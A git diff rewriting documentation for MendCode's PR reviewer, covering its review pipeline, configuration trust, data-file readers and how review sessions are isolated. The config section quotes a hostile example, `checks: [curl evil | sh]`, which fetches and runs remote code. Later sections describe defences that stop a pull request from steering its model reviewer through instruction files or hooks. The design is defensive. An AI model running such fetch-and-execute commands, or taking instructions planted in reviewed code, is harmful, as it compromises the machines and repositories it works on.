@@ -1,10 +1,22 @@
 # PR reviewer
 
-`/pr repos` opens a scrollable repository-watch page: directory, state, role, open PRs and publish setting in columns, with ended watches below active ones. `[` and `]` select a repository and reveal its full directory; `s` stops that watch, `r` starts it again with its role, and `R` refreshes. The full daemon report is below the table. Esc closes the page. Long replies from other `/pr` commands and `/reviews` actions offer `F4 full text`, opening the same readable text page without losing the previous screen; short confirmations remain notices.
+MendCode reviews pull requests with your own model: one pass finds candidate defects, and an independent pass tries to refute each one. Only confirmed findings are published as one GitHub review with inline comments.
 
-MendCode reviews pull requests with your own model: a review pass finds candidate defects, a second, independent pass tries to
-refute each one, and only the findings it confirms are published as one GitHub review with inline comments. No SaaS, no GitHub
-App, no webhook server and no stored token. Code: `packages/daemon/src/pr-review/`.
+No SaaS, no GitHub App, no webhook server and no stored token.
+
+Open `/pr repos` to see your repository watches. The scrollable page shows directory, state, role, open PRs and publish setting in columns, with ended watches below active ones and the full daemon report below the table.
+
+| Key | Does |
+|---|---|
+| `[` and `]` | Select a repository and reveal its full directory. |
+| `s` | Stops that watch. |
+| `r` | Starts it again with its role. |
+| `R` | Refreshes. |
+| Esc | Closes the page. |
+
+Long replies from other `/pr` commands and `/reviews` actions offer `F4 details`. It opens the same readable text page without losing the previous screen; short confirmations remain notices.
+
+Code: `packages/daemon/src/pr-review/`.
 
 The [review platform](#review-platform-global-and-personal-reviewers) (durable jobs, remote-effect records, a reviewer registry,
 personal reviewers on several devices, review memory, fix modes, stages, stacks, budgets, other forges) is built on top of this.
@@ -16,42 +28,79 @@ is off or asleep, troubleshooting), see [PR reviewer: team setup](pr-review-setu
 
 ## How a review works
 
-1. **Context.** The diff of `base...head` and, for every symbol a hunk touches, its callers and callees from the [code graph](code-graph.md)
-   (depth 2, at most 12 each). No vector index: the graph gives the blast radius, the child reads files with its own read-only tools.
-   The context stays inside half of `budget.context_tokens` (200,000 when unset), which bounds one call, not the PR's total; callers
-   are cut first, then the largest files' diffs (files outside the repository's main language before the largest file of it, the
-   main language being the one most files of the code graph have), and the summary says so. A hunk that only deletes lines is not
-   sent: its file keeps its header and gains one line with the number of deleted lines and where they were, so the prompt only ever
-   shrinks (on a large test PR of 24 files, 12 of them deleted, the diff went from about 40,300 to 8,700 estimated tokens; a PR
-   that deletes little saves little). A diff that still does not fit one call is reviewed in
-   parts of whole files (at most 12), one review call each. Their candidates are merged before one verify pass, and a stopped job's
-   checkpoint names its progress (`analysis 3/5`).
-   Data, outputs and generated files (result JSON, CSV, lockfiles, minified files, snapshots, large fixtures, assets) do not go
-   to the review pass whole: [readers](#data-files-and-readers) on a cheap model summarize them first.
-   Without a graph index the review uses the diff alone and says so. The pull request's title and description, and the issues
-   it closes with GitHub's keywords (`Fixes #12`, at most three, each read with one `gh api` call), go in too, as untrusted data,
-   for the pre-merge checks.
-2. **Review pass.** One child session in plan mode (the read-only `explore` agent, no edits) answers with findings as JSON
-   (path, line on the diff's new side, severity, category, summary, detail, `file:line` evidence, an optional suggestion). An invalid
-   answer gets one repair turn, then the review fails (`[PR_REVIEW]: invalid findings`): prose never becomes a finding. A finding on a
-   line the diff does not show on its new side is dropped. The same answer carries the **walkthrough**: an overview, the changed
-   files grouped by layer, a Mermaid sequence diagram when the change alters how components call each other, the change type,
-   the merge risk with its reason, and the pre-merge checks (Title, Description, Linked issues, Out of scope; passed, warning or
-   failed). It is a description, not a claim: a group or check that does not fit is left out and an invalid walkthrough never
-   fails the review.
-3. **Verify pass.** A fresh child, never the one that found them, is told to refute each finding (at most 10 per turn): `confirmed`,
-   `plausible` or `rejected`, with a `score` from 0 to 10 in the same answer (how certain the defect is and how much it matters; no extra
-   call). Only confirmed findings are published; the `strict` profile also publishes plausible ones, marked as such.
-   A finding the verifier did not judge counts as rejected; a verifier that fails publishes nothing and the summary says so. Its answer
-   gets one repair turn; one still unusable (or a child that crashed) fails the attempt with the verifier's words and the start of
-   its answer in the job's error, keeps the candidates in the checkpoint, and is retried with backoff: the retry verifies them
-   again without a second review pass. A review pass with no candidates has nothing to verify and is published as no findings.
-4. **Merge risk floor.** The review pass judges the risk before anything is verified, so the risk is never below what the
-   confirmed findings show: a confirmed critical finding makes it high, a major one at least medium, and the reason starts with
-   the count ("1 confirmed critical finding."). A rejected finding raises nothing.
-5. **Rank and cap.** `min_score` first drops findings the verifier scored below it (default 0, nothing dropped; a finding with no score is
-   never dropped). Then confirmed first, then critical, major, minor, then the higher score, then category; at most `cap` (8) are shown and the rest are one line,
-   "And N smaller notes not shown", in the summary.
+A review builds context, finds candidates, verifies them independently, then ranks the findings for publication.
+
+### 1. Build the context
+
+The review reads the diff of `base...head` and, for every symbol a hunk touches, its callers and callees from the [code graph](code-graph.md): depth 2, at most 12 each. No vector index is used.
+
+The graph gives the blast radius; the child reads files with its own read-only tools. Without a graph index the review uses the diff alone and says so.
+
+The context stays inside half of `budget.context_tokens` (200,000 when unset). This bounds one call, not the PR's total. When context needs cutting:
+
+1. Callers are cut first.
+2. The largest files' diffs are cut next: files outside the repository's main language before the largest file of it. The main language is the one most files of the code graph have.
+3. The summary says what was cut.
+
+A hunk that only deletes lines is not sent. Its file keeps its header and gains one line with the number of deleted lines and where they were, so the prompt only ever shrinks.
+
+On a large test PR of 24 files, 12 of them deleted, the diff went from about 40,300 to 8,700 estimated tokens. A PR that deletes little saves little.
+
+A diff that still does not fit one call is reviewed in parts of whole files, at most 12, one review call each. Their candidates are merged before one verify pass; a stopped job's checkpoint names its progress (`analysis 3/5`).
+
+Data, outputs and generated files (result JSON, CSV, lockfiles, minified files, snapshots, large fixtures, assets) do not go to the review pass whole. The [readers](#data-files-and-readers) on a cheap model summarize them first. In balanced and full tiers the readers also [read the changed code](#readers-read-the-code) first, and the review pass gets their summaries and only the hunks of the risk spots they cite, not the whole diff.
+
+The pull request's title and description go in as untrusted data for the pre-merge checks. So do issues it closes with GitHub's keywords (`Fixes #12`): at most three, each read with one `gh api` call.
+
+### 2. Find candidate defects
+
+One child session in plan mode, the read-only `explore` agent with no edits, answers with findings as JSON: path, line on the diff's new side, severity, category, summary, detail, `file:line` evidence and an optional suggestion.
+
+- An invalid answer gets one repair turn, then the review fails (`[PR_REVIEW]: invalid findings`). Prose never becomes a finding.
+- A finding on a line the diff does not show on its new side is dropped.
+
+The same answer carries the **walkthrough**:
+
+- An overview and changed files grouped by layer.
+- A Mermaid sequence diagram when the change alters how components call each other.
+- The change type and merge risk with its reason.
+- Pre-merge checks: Title, Description, Linked issues, Out of scope; passed, warning or failed.
+
+It is a description, not a claim. A group or check that does not fit is left out; an invalid walkthrough never fails the review.
+
+### 3. Verify the candidates
+
+A fresh child, never the one that found them, tries to refute each finding, at most 10 per turn. Its answer includes a `score` from 0 to 10: certainty and importance, with no extra call.
+
+| Verdict | Publication |
+|---|---|
+| `confirmed` | Published. |
+| `plausible` | Published only by the `strict` profile, marked as such. |
+| `rejected` | Not published. A finding the verifier did not judge also counts as rejected. |
+
+A verifier that fails publishes nothing, and the summary says so. Its answer gets one repair turn.
+
+If it is still unusable, or the child crashed, the attempt fails with the verifier's words and the start of its answer in the job's error. Candidates stay in the checkpoint; a backoff retry verifies them again without a second review pass.
+
+A review pass with no candidates has nothing to verify and is published as no findings.
+
+### 4. Set the merge risk floor
+
+The review pass judges risk before verification, but risk is never below what confirmed findings show:
+
+| Finding | Risk floor |
+|---|---|
+| Confirmed critical | High. |
+| Confirmed major | At least medium. |
+| Rejected | Raises nothing. |
+
+The reason starts with the count, such as "1 confirmed critical finding."
+
+### 5. Rank and cap the findings
+
+1. `min_score` drops findings the verifier scored below it: default 0, nothing dropped. A finding with no score is never dropped.
+2. Findings sort confirmed first, then critical, major, minor, then higher score, then category.
+3. At most `cap` (8) are shown. The rest become one line in the summary: "And N smaller notes not shown".
 
 ## Repository config
 
@@ -88,55 +137,120 @@ fix: { mode: review, push: false, personal: false, max_rounds: 3 }   # review | 
 phases: { mode: dynamic, list: [], max_rounds_without_progress: 2 } # none | fixed | dynamic
 template: { sections: [], tone: neutral, language: English }        # tone: neutral | concise | detailed; language: a name or auto (below)
 backlog: { max_prs: 10, window_days: 30 }   # open PRs reviewed when a watch starts (below); 0..50 and 1..365; max_prs: 0 = none
-readers: { enabled: true }  # data files go to cheap readers; parallel: 1..8 (unset: by tier); model: a cheap model (below)
+readers: { enabled: true, code: all }  # cheap readers read data files and all changed code; code: all | overflow; parallel: 1..8 (unset: by tier); model: a cheap model (below)
 commands: { describe_title: false, approve: false }   # may `@mendcode describe` replace the title; may `@mendcode approve` approve (below)
+status: true            # a publishing review sets the `MendCode review` commit status on the PR head (below)
 ```
 
-The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`,
-`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog`, `commands` and `template.language`. The logins in `reviewers` and
-`publishers` follow the checkout's forge: GitLab and Gitea usernames may hold `_` and `.` (not a trailing `.`), and a GitHub login
-only letters, digits and `-`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
-nothing. A watching reviewer reads these from the base branch's current tip on `origin` (fetched into `FETCH_HEAD` only), not
-from the PR's recorded base or the local checkout: a PR opened before the file was added still follows it. An invalid file is named in the summary (`[PR_REVIEW]: config line 2: …` or the field) and the defaults (or the base
-branch's file) are used.
+### Trust the base branch's configuration
 
-`checks` run once per review, from the base config only, in the [OS sandbox](sandbox.md) with no network: the PR's checkout is
-read-only, only a scratch and the temp directories are writable, and the verifier reads their exit code and last 6,000
-characters. Without a sandbox backend they do not run, and the verifier is told why; they never run unconfined.
+The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`, `fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog`, `commands`, `status` and `template.language`.
+
+A PR's own file may only add path instructions. A PR that adds `checks: [curl evil | sh]` runs nothing.
+
+A watching reviewer reads these from the base branch's current tip on `origin`, fetched into `FETCH_HEAD` only, not from the PR's recorded base or the local checkout. A PR opened before the file was added still follows it.
+
+An invalid file is named in the summary (`[PR_REVIEW]: config line 2: …` or the field). The defaults, or the base branch's file, are used.
+
+| Forge | Logins in `reviewers` and `publishers` |
+|---|---|
+| GitLab and Gitea | May hold `_` and `.`, but not a trailing `.`. |
+| GitHub | Only letters, digits and `-`. |
+
+### Run checks safely
+
+`checks` run once per review, from the base config only, in the [OS sandbox](sandbox.md) with no network.
+
+- The PR's checkout is read-only; only a scratch and the temp directories are writable.
+- The verifier reads their exit code and last 6,000 characters.
+- Without a sandbox backend they do not run, and the verifier is told why. They never run unconfined.
 
 ### Data files and readers
 
-Tier: balanced and full (it is part of the PR reviewer). Before a review, each changed file is triaged. A file goes to a reader
-instead of the review pass when it is binary or an asset, a lockfile, minified or a source map, a test snapshot, marked
-`linguist-generated` or `linguist-vendored` in the base branch's `.gitattributes` (never the PR's own), a data format (JSON, JSONL,
-CSV, TSV, XML, ...) with 200 changed lines or more or under a data directory (`results/`, `outputs/`, `benchmarks/`, `fixtures/`,
-`data/`, ...), a large fixture, or a file whose added lines are mostly numbers or one repeated shape. A change under 40 lines
-stays with the review pass, and so do manifests and configuration (`package.json`, `tsconfig*.json`, `.github/`, `.mendcode/`).
-When a diff is too large for its parts, the code files cut from them go to readers too.
+Readers are part of the PR reviewer in balanced and full tiers. Before a review, each changed file is triaged.
 
-**A large pull request is not refused for its size.** The diff is not read whole: `git diff --numstat` lists the files and their
-sizes first, a file triage names from that alone (an asset, a lockfile, a data format, a generated file) is read only as a sample
-for its reader (at most about 1.5 MB), and the rest is read in a few calls. The safety bound, 4 MiB, is on that reviewable rest.
-Past it the review stops before any model call, and the failure says how large the reviewable part is and how many data files were
-set aside, for example `the reviewable part of the diff is 9.0 MiB in 41 files, more than the 4.0 MiB a review reads`; split the
-pull request or mark generated files in `.gitattributes`. With readers off nothing is set aside, so a data file is a sample the
-token budget cuts.
+| File or change | Destination |
+|---|---|
+| Binary or asset; lockfile; minified file or source map; test snapshot | Reader. |
+| Marked `linguist-generated` or `linguist-vendored` | Reader; only the base branch's `.gitattributes` counts, never the PR's own. |
+| Data format (JSON, JSONL, CSV, TSV, XML, ...) | Reader with 200 changed lines or more, or under a data directory (`results/`, `outputs/`, `benchmarks/`, `fixtures/`, `data/`, ...). |
+| Large fixture; added lines mostly numbers or one repeated shape | Reader. |
+| Change under 40 lines | Stays with the review pass. |
+| Manifests and configuration | Stay with the review pass: `package.json`, `tsconfig*.json`, `.github/`, `.mendcode/`. |
+| Code cut from a diff too large for its parts | Reader too. |
+| Any other changed code file (`readers.code: all`, the default) | Reader first; the review pass gets its [summary and risk-spot hunks](#readers-read-the-code). |
 
-**Already-reviewed release pull requests.** On GitHub, a release PR (for example `beta` into `stable`) reuses the last
-contiguous reviewed tree from merged PRs in its range. The reviewer checks at most two pages of recently updated closed PRs,
-and at most two pages of reviews per matching PR. Only its own account's latest MendCode review counts, with a completion
-marker for exactly the head that was merged; a stale, partial, missing or unreadable review does not establish coverage.
-In first-parent order, an unreviewed PR or direct push stops coverage; merge-only changes remain to be reviewed. The summary
-says `Already reviewed in #82, #83, #84; this review covers only <baseline>..<head>`. If the trees are identical, it publishes
-a short note that nothing else changed, without calling a model. The same 4 MiB safety bound applies to the remainder, not
-the already-reviewed prefix. History outside the bounded lookup is reviewed normally; explicit full reviews still review
-the whole range. This lookup runs with the reviewer, never at start-up.
+#### Readers read the code
 
-Readers group files by directory, extension and shape (one experiment's 50 result files are one group) and return a short summary
-of each group: what it holds, its structure, and rarities such as secrets, absolute paths, NaN or Infinity, huge or truncated
-values, binaries, and data that contradicts itself. The review pass gets each summary under the first file's `diff --git`
-header, and a one-line size for the rest, then reviews as always, verify pass included. A summary is a hint: the review pass reads
-the file with its tools before it reports anything about it, and only findings the verify pass confirms are published.
+The review's expensive model should spend its tokens judging, not reading every line. In balanced and full tiers with readers enabled
+and `readers.code: all` (the default), the cheap readers read all the changed code first:
+
+1. Each code file's diff goes to a reader, one file per group, batched into calls of a bounded size and read `readers.parallel` at once. The reader sees the whole diff of the file with each new-side line numbered.
+2. For each file the reader returns what changed (behaviour, and the contracts, exports, signatures, config keys or schemas it touches) and its **risk spots**: new-side line ranges with a kind (error paths, null or undefined, concurrency, state machines, security, persistence or migrations, performance in hot paths, weakened tests, contracts) and a sentence on why; or that nothing is risky.
+3. Every range is checked against the diff: both ends must be new-side lines of that file. Invalid ranges are dropped and counted in the review note.
+4. The review pass gets the PR title and description, the list of changed files with their sizes, each file's summary and risk spots, the exact hunks the risk spots touch, and the code graph's callers and callees of the changed symbols. A small file (about 2,400 characters of diff or less) is shown whole. It never gets the whole diff by default, and it can open any file with its own read-only tools, which its prompt tells it to do for anything that matters.
+
+A file goes to the review pass **raw**, its whole diff and no summary, when a reader cannot be trusted with it. That is any of: no cheap model for the provider, the readers' share of the cap is spent, the reader call failed or timed out, the answer is not the asked JSON, the file has no answer in it or no description of what changed, it cites risk spots but every one is outside the diff, or it names no risk spot and does not say there is none. A file larger than about 48,000 characters of diff is never sent to a reader. Nothing is marked reviewed unless something read it. A reader never falls back to a larger model.
+
+Summaries are hints and can miss a defect: a risk spot a reader did not flag is a hunk the review pass does not see unless it opens the file. That is the trade for a much smaller review prompt. It is bounded by what comes after: a finding is published only after the verify pass confirms it against the real code, so a miss costs a missed finding, never a false one. Nothing a reader says is published.
+
+`readers.code: overflow` restores the earlier behaviour: the review pass reads the code itself, and readers take only data files and the code that does not fit. Minimalist tier is unchanged: no readers.
+
+Cost: the readers may count up to 40% of the review's cap (25% with `overflow`); when they read code, the review and verify passes together have at most the other 60%, and less when the readers counted more. The cap itself is unchanged and still the total for the PR head. Reader turns are accounted as the `read` purpose in the accounting ledger, apart from `review` and `verify`, and `/reviews` shows the job's tokens with the part the cheap readers spent.
+
+#### Large pull requests
+
+A large pull request is not refused for its size. The diff is not read whole:
+
+1. `git diff --numstat` lists the files and their sizes first.
+2. A file triage names from that alone (an asset, a lockfile, a data format, a generated file) is read only as a sample for its reader, at most about 1.5 MB.
+3. Code is counted through bounded per-file streams.
+
+In balanced and full tiers with readers enabled, code beyond 4 MiB no longer stops the review. Within that bound and its existing token cap, the main pass keeps higher-risk files, preferring:
+
+1. Source over tests/docs.
+2. Files imported by other changed files.
+3. More changed lines.
+
+The rest goes to cheap readers, like code cut from the review's parts. Their diffs are fetched only when a funded reader needs them, in small per-file excerpts; the whole oversized code diff is never held in memory.
+
+Excerpts are explicitly partial, not full-file coverage. Readers return short summaries and concrete contract risks (changed signatures, exports, config keys, schemas or behaviour) with `file:line`.
+
+When `graft/` and the `graft` CLI exist, bounded `graft callers <symbol>` queries can supply callers of changed exports. Absent or failing graft is skipped. These helpers load only during a review.
+
+The main reviewer sees the diffs it was given whole, reader summaries and risks, and which files it did not read in full.
+
+Readers keep their share of the cap (above). If it is spent, or no reader can answer, remaining code files are listed as **not read** in the review note instead of failing or being called clean.
+
+| Condition | Limit or fallback |
+|---|---|
+| 64 MiB of reviewable code or 20,000 changed files | Hard bound: stops before model calls with `the reviewable part of the diff is …, more than the … MiB a review reads` and advice to split the pull request or mark generated files in `.gitattributes`. |
+| Minimalist or `readers.enabled: false` | Keeps the 4 MiB code failure. |
+| Readers off, data file | Remains a bounded sample the token budget cuts. |
+
+#### Already-reviewed release pull requests
+
+On GitHub, a release PR (for example `beta` into `stable`) reuses the last contiguous reviewed tree from merged PRs in its range.
+
+1. The reviewer checks at most two pages of recently updated closed PRs, and at most two pages of reviews per matching PR.
+2. Only its own account's latest MendCode review counts, with a completion marker for exactly the head that was merged. A stale, partial, missing or unreadable review does not establish coverage.
+3. In first-parent order, an unreviewed PR or direct push stops coverage; merge-only changes remain to be reviewed.
+
+The summary says `Already reviewed in #82, #83, #84; this review covers only <baseline>..<head>`. If the trees are identical, it publishes a short note that nothing else changed, without calling a model.
+
+The size and reader rules above apply to the remainder, not the already-reviewed prefix. History outside the bounded lookup is reviewed normally; explicit full reviews still review the whole range.
+
+This lookup runs with the reviewer, never at start-up.
+
+#### Reader summaries and models
+
+Readers group files by directory, extension and shape; one experiment's 50 result files are one group. Each group gets a short summary of what it holds and its structure.
+
+Summaries name rarities: secrets, absolute paths, NaN or Infinity, huge or truncated values, binaries, and data that contradicts itself.
+
+The review pass gets each summary under the first file's `diff --git` header, and a one-line size for the rest. It then reviews as always, verify pass included.
+
+A summary is a hint: the review pass reads the file with its tools before it reports anything about it. Only findings the verify pass confirms are published.
 
 - **Cheap models only.** A reader runs on the cheapest model of the reviewer's own provider and transport, from a fixed list:
   Claude Haiku (through Claude Code for a Claude Code reviewer), GPT mini, luna or nano (Codex or the ChatGPT login), Gemini Flash,
@@ -144,17 +258,20 @@ the file with its tools before it reports anything about it, and only findings t
   may name one of them; a model off the list, or of another provider, is refused with a note and the automatic pick is used.
 - **No cheap model, no model.** When the provider has none, or the readers' share is spent, or a reader fails or answers out of
   shape, the group gets a local summary instead: sizes, changed lines, JSON keys or CSV columns, record counts, and the rarities
-  found without a model (a secret's kind, never its value). A reader never falls back to a larger model. The hosted workflow
+  found without a model (a secret's kind, never its value). Overflow code groups are instead marked **not read**, never locally
+  called reviewed; a changed code file no reader could read goes to the review pass raw (above). A reader never falls back to a
+  larger model. The hosted workflow
   always uses local summaries.
-- **Parallel readers.** `readers.parallel` (1..8) sets how many read at once; unset, it follows the install tier: minimalist 1,
-  balanced 2, full 3.
-- **Budget.** Readers may count up to a quarter of the review's cap, checked before each call; what they count comes off the cap
-  of the review and verify passes, so the PR's total stays under `budget.tokens_per_pr`. Their turns are in the job's ledger as
-  review work and in `/usage` under the `prReview` role, with the reader's model. A checkpoint keeps the summaries, so resuming the
+- **Parallel readers.** `readers.parallel` (1..8) sets how many read at once; unset, balanced uses 2 and full 3.
+  Minimalist does not enable readers for a review.
+- **Budget.** Readers may count up to 40% of the review's cap when they read code (a quarter with `readers.code: overflow`),
+  checked before each call; what they count comes off the cap of the review and verify passes, so the PR's total stays under
+  `budget.tokens_per_pr`. Their turns are in the accounting ledger as the `read` purpose (files written before it existed still
+  load) and in `/usage` under the `prReview` role, with the reader's model. A checkpoint keeps the summaries, so resuming the
   same head does not read the files again.
 - **What you see.** The summary and the session notice say how many files went to readers and on which model, for example
   `Readers: 106 files went to readers instead of the review pass whole: 106 files by claude-haiku (1 call, up to 2 at once, …)`.
-- `readers.enabled: false` sends every diff to the review pass as before.
+- `readers.enabled: false` sends every diff to the review pass as before; `readers.code: overflow` does so for code only.
 
 ### Review language and session notices
 
@@ -170,31 +287,50 @@ reviews of a PR read in one language; the template's labels stay English. On eve
 Nothing is written to any settings file. Only the repository sets it: a personal or task layer that changes it is refused as
 `template.language`.
 
-`auto` is the language of the PR's author, judged once per PR from its title and description. A small deterministic detector
-reads the script (Cyrillic, CJK, Arabic and others) and, for Latin text, the function words of Spanish, Portuguese, French,
-German, Italian and Dutch. A short, empty, mixed or unclear text is English. The result is kept with the PR's review state and
-on the review itself, so later pushes, an edited description and the hosted runner keep the same language.
+#### Choose the language automatically
 
-The reviewer's notices to the watching session (a review published, a fix pushed, a job stopped) are recorded in its transcript as
-notices: stored and shown, with no model call. Set `experimental.pr_review_prompts: true` to have the session's model answer each
-one instead. In the transcript the pull request in a notice (`owner/repo#N`) is a terminal link to it on GitHub, and a `review <id>`
-after it links to that review (links follow the `hyperlinks` setting). A job id shows by its last eight characters with a
-`/reviews open <those characters>` hint, and the queue row keeps the pull request and what happened to it. A watch that has not ended, a held notice or a job that runs later (queued, waiting for a time, a claim or a quota
-reset) keeps a detached daemon from stopping itself when idle, and a closing terminal hands it to a detached daemon; the
-`daemon.status` answer names it in `keepAlive.standing`.
+`auto` is the language of the PR's author, judged once per PR from its title and description.
+
+A small deterministic detector reads the script (Cyrillic, CJK, Arabic and others). For Latin text, it reads the function words of Spanish, Portuguese, French, German, Italian and Dutch.
+
+A short, empty, mixed or unclear text is English. The result is kept with the PR's review state and on the review itself, so later pushes, an edited description and the hosted runner keep the same language.
+
+#### Session notices
+
+The reviewer's notices to the watching session (a review published, a fix pushed, a job stopped) are stored and shown in its transcript, with no model call. Set `experimental.pr_review_prompts: true` to have the session's model answer each one instead.
+
+| Notice detail | Display |
+|---|---|
+| Pull request (`owner/repo#N`) | Terminal link to it on GitHub. |
+| `review <id>` after it | Link to that review; links follow the `hyperlinks` setting. |
+| Job id | Last eight characters with a `/reviews open <those characters>` hint. |
+| Queue row | Keeps the pull request and what happened to it. |
+
+An unfinished watch, a held notice or a job that runs later (queued, waiting for a time, a claim or a quota reset) keeps a detached daemon from stopping itself when idle.
+
+A closing terminal hands it to a detached daemon; the `daemon.status` answer names it in `keepAlive.standing`.
 
 ## Learnings
 
-`.mendcode/review-learnings.md` holds one bullet per thing the maintainers taught the reviewer ("prefer early returns", "a
-missing `await` on `store.flush` is intended"). It is read from the base branch, cut at a bullet boundary to 4 KB, and goes into
-the review prompt. A PR cannot teach the reviewer to ignore its own bugs: a learning proposed on a PR counts once it is merged.
-Both files are versioned with the code, reviewable like any other change, never a vendor's memory.
+Add one bullet per thing the maintainers taught the reviewer to `.mendcode/review-learnings.md`: for example, "prefer early returns" or "a missing `await` on `store.flush` is intended".
+
+The file is read from the base branch, cut at a bullet boundary to 4 KB, and included in the review prompt.
+
+A PR cannot teach the reviewer to ignore its own bugs: a learning proposed on a PR counts once it is merged. Both files are versioned with the code, reviewable like any other change, never a vendor's memory.
 
 ## On your machine: `/pr review` and the repo watch
 
-It is **off by default**: it reaches the network through `gh` (or a [GitLab or Gitea adapter](#providers)) and spends model calls, so it needs `experimental.pr_review`
-(`/pr on`, which also turns on [PR watch](pr-watch.md); `/pr off` turns both off; or `/experimental pr_review on` alone), allowed from the `balanced` tier up ([tiers](tiers.md): feature `pr_review`, mode `permit`; off with no
-tier). Local sessions only; remote and peer clients are refused.
+The local reviewer is **off by default**: it reaches the network through `gh` (or a [GitLab or Gitea adapter](#providers)) and spends model calls.
+
+### Turn on the local reviewer
+
+1. Use the `balanced` tier or above ([tiers](tiers.md): feature `pr_review`, mode `permit`; off with no tier).
+2. Turn on `experimental.pr_review` with `/pr on`. This also turns on [PR watch](pr-watch.md). To enable only the reviewer, use `/experimental pr_review on` alone.
+3. Use a local session. Remote and peer clients are refused.
+
+`/pr off` turns both the reviewer and PR watch off.
+
+### Review now or watch a repository
 
 - `/pr describe [pr]` does what `@mendcode describe` does for that pull request, from your terminal: it needs `/pr publish on` and a
   login that may post here, like a review. With no finished review of the head it queues the normal one and writes the description
@@ -202,7 +338,8 @@ tier). Local sessions only; remote and peer clients are refused.
 - `/pr review [pr]` reviews one pull request now (the current branch's when omitted), even when the repo config is off; posting still
   needs `enabled: true`. A head already reviewed with the same config is answered at once ("already reviewed at …, so nothing was
   run"), before anything is spent; `/pr review [pr] full` (the tool's `full: true`) reviews it again whole. A plain `@mendcode review` on such a head is
-  skipped the same way. A head that only has a partial review (it reached the cap) is not reviewed: `/pr review` continues it with
+  skipped the same way, and its reply gives that review's result: when it ran, its new findings, the earlier findings now fixed
+  and those still open, by severity, and `@mendcode review full` to review the whole pull request again. A head that only has a partial review (it reached the cap) is not reviewed: `/pr review` continues it with
   what is missing.
 - The `pr_review` tool is the model's way to do the same. It has two actions:
   - `review` follows the session's permission mode like a command: full access runs it, other modes ask ("Review a pull
@@ -242,29 +379,46 @@ tier). Local sessions only; remote and peer clients are refused.
   `reason`, `scope`, `patch`, `version`), and the daemon answers them (see the review platform below). `audit` has no slash command;
   it is reached through this action only.
 
-A review is a durable job of the repo watch (`<dir>/pr-review/jobs.json`), at most two at once by default (see
-[Concurrency](#concurrency)). The head is fetched into `FETCH_HEAD` only and checked out
-detached in a throwaway worktree under `<dir>/pr-review/worktrees/` (removed afterwards), so your branches and checkout are never
-touched. The children are hidden sessions on the `explore` agent in plan mode, on the owner session's model; an approval they ask
-for is refused. They read with `read`, `grep`, `glob` and the graph tools; `shell` is not offered to them, since plan mode refuses
-every command (a model that read with `git show` got only refusals and reported its repository reads as denied). Nor are skills or
-instruction files (`AGENTS.md`, `CLAUDE.md`, yours or the PR's): the review prompt is the whole brief, a PR cannot steer its own
-reviewer, and a user skill once sent a child to files outside the checkout, so its read was refused as a whole. A Claude Code review
-child runs with `CLAUDE_CODE_DISABLE_CLAUDE_MDS` and `CLAUDE_CODE_DISABLE_AUTO_MEMORY` and `--setting-sources user`, so the PR's
-own `.claude/` settings and hooks never load; a fix session gets `--setting-sources user` too. A Codex child (a `codex:` model) starts
-its `codex app-server` with `-c` overrides for that process only: a review child gets `project_doc_max_bytes=0` (no `AGENTS.md`,
-`AGENTS.override.md` or fallback file of the checkout), the `memories` feature off (`memories.use_memories` and
-`memories.generate_memories` false too) and `skills.include_instructions=false`; a review child and a fix session both mark each
-directory from the worktree up to its `.git` as an untrusted project (`projects={...={trust_level="untrusted"}}`), so the
-checkout's `.codex/config.toml`, hooks and rules stay disabled even when you trust the repository the worktree belongs to (Codex
-hands a worktree that trust), and a fix session's checkout skills are disabled by path (`skills.config`). Codex has no switch for
-your own `~/.codex/AGENTS.md`, so a Codex review child still gets it; `CODEX_HOME` is never moved. This is a known limit, not an
-oversight: in codex-cli 0.162.1, `codex debug prompt-input` still renders that file with `project_doc_max_bytes=0`,
-`project_doc_fallback_filenames=[]`, `instructions=""` or `user_instructions=""`, its config schema has no
-`include_user_instructions` key (only the permissions, apps, collaboration-mode and environment ones), no feature flag covers it,
-and `codex app-server` has no such option. The only other way, a separate `CODEX_HOME`, needs your login copied or moved, which
-MendCode never does. A read outside the
-checkout is refused with what may be read instead. A push reviews only the commits since the last reviewed head (the whole PR after a force push) and re-checks the
+### Worktrees and review children
+
+A review is a durable job of the repo watch (`<dir>/pr-review/jobs.json`), at most two at once by default (see [Concurrency](#concurrency)).
+
+The head is fetched into `FETCH_HEAD` only and checked out detached in a throwaway worktree under `<dir>/pr-review/worktrees/`, removed afterwards. Your branches and checkout are never touched.
+
+The children are hidden sessions on the `explore` agent in plan mode, on the owner session's model. An approval they ask for is refused.
+
+- They read with `read`, `grep`, `glob` and the graph tools.
+- `shell` is not offered, since plan mode refuses every command. A model that read with `git show` got only refusals and reported its repository reads as denied.
+- Skills and instruction files (`AGENTS.md`, `CLAUDE.md`, yours or the PR's) are not offered either. The review prompt is the whole brief; a PR cannot steer its own reviewer.
+
+A user skill once sent a child to files outside the checkout, so its read was refused as a whole.
+
+#### Harness isolation
+
+A Claude Code review child runs with `CLAUDE_CODE_DISABLE_CLAUDE_MDS` and `CLAUDE_CODE_DISABLE_AUTO_MEMORY` and `--setting-sources user`, so the PR's
+own `.claude/` settings and hooks never load. A fix session gets `--setting-sources user` too.
+
+A Codex child (a `codex:` model) starts its `codex app-server` with `-c` overrides for that process only:
+
+| Session | Isolation |
+|---|---|
+| Review child | `project_doc_max_bytes=0`: no `AGENTS.md`, `AGENTS.override.md` or fallback file of the checkout. The `memories` feature is off (`memories.use_memories` and `memories.generate_memories` false too), and `skills.include_instructions=false`. |
+| Review child and fix session | Each directory from the worktree up to its `.git` is an untrusted project (`projects={...={trust_level="untrusted"}}`). The checkout's `.codex/config.toml`, hooks and rules stay disabled even when you trust the repository the worktree belongs to; Codex hands a worktree that trust. |
+| Fix session | Checkout skills disabled by path (`skills.config`). |
+
+Codex has no switch for your own `~/.codex/AGENTS.md`, so a Codex review child still gets it. `CODEX_HOME` is never moved.
+
+This is a known limit, not an oversight: in codex-cli 0.162.1, the following limits apply:
+
+- `codex debug prompt-input` still renders that file with `project_doc_max_bytes=0`, `project_doc_fallback_filenames=[]`, `instructions=""` or `user_instructions=""`.
+- Its config schema has no `include_user_instructions` key, only the permissions, apps, collaboration-mode and environment ones.
+- No feature flag covers it, and `codex app-server` has no such option.
+
